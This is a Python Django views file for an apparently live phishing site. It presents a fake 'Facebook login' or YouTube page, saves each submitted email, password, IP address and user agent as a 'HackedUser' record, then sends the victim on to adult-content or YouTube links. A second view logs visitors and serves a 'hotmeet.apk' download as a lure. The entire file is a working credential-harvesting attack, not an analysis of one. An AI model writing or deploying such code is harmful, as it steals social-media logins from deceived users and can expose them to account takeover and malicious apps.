import winsound

from django.contrib import messages
from django.shortcuts import render, redirect
from colorama import Fore, Style

# Create your views here.
from Fapachi.models import RequestUser, HackedUser


def index(request):
    template = "youtube.html"
    #template = "fb_index.html"
    # template = "index.html"
    include_js = False

    context = {"include_js": include_js,
               "title": "Hot Meet Login with Facebook" if template == "index.html" else "Facebook login"}

    meta = request.META
    ip = meta['REMOTE_ADDR']
    description = meta['HTTP_USER_AGENT']
    print("[+] Request ingoing", ip, description)

    if request.method == "POST":
        email = request.POST["email"]
        password = request.POST['password']
        print(Fore.LIGHTYELLOW_EX, "[!] probe this ", email, password)
        if email is not None and password is not None:
            if len(email) > 5 and "@" in email and len(password) > 6:

                HackedUser.objects.create(
                    email=email,
                    password=password,
                    ip=ip,
                    description=description

                )
                winsound.Beep(1000, 440)
                print(Fore.GREEN, "[+] success profile catch", email, " - ", password)
                print(Style.RESET_ALL)

                if template == "index.html":
                    return redirect("https://fapachi.com/sarah-atoms/")
                    # return redirect("https://fapachi.com/copykat")
                    # return redirect("https://www.instagram.com/ambermc2/?hl=en")
                    # return redirect("https://ladjkj.miracuiousdate.com/c/da57dc555e50572d?s1=116274&s2=1502497&s3=NOBLESSE&click_id=KENT_&j1=1")
                    # return redirect("http://hotmeet.servebeer.com/static/my_favorite_pose.png")
                    # return redirect("https://fapachi.com/tiffanybree69")
                    # return redirect("https://fapachi.com/bebe-rexha")
                    # return redirect("/static/lilla.mp4")
                    # return redirect("https://fapachi.com/shy-trans")
                if template == "fb_index.html":
                    # return redirect("https://www.facebook.com/100000099322552/videos/3140763042603642/")
                    # return redirect("http://hotmeet.servebeer.com/static/my_favorite_pose.png")
                    return redirect("https://youtu.be/ELTtFZ56UJM?t=402")
                    # return redirect("http://hotmeet.servebeer.com/static/semmi.png")

                if template == "youtube.html":
                    return redirect("https://youtu.be/5WWxbfktyoQ?t=2382")


            else:
                messages.warning(request, "Hibás bejelentkezési adatok, a fiók nem található.")
    print(Style.RESET_ALL)
    RequestUser.objects.create(remote_addr=ip, user_agent=description)

    return render(request, template, context)


def apk(request):
    context = {}
    meta = request.META
    ip = meta['REMOTE_ADDR']
    description = meta['HTTP_USER_AGENT']
    print(Fore.LIGHTMAGENTA_EX, "[+] Request ingoing the apk download", ip)
    print(Fore.LIGHTMAGENTA_EX, "[+] header is", description)
    return redirect("/static/hotmeet.apk")
